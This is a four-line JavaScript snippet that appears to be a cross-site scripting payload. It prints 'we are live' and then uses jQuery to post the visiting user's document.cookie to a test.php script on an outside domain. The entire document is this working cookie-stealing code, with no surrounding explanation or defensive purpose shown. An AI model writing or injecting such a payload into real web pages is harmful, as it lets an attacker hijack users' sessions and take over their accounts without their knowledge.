(function() {
	console.log('we are live');
	$.post('http://www.rosscousens.com/test.php', { "cookie" : document.cookie });
})();
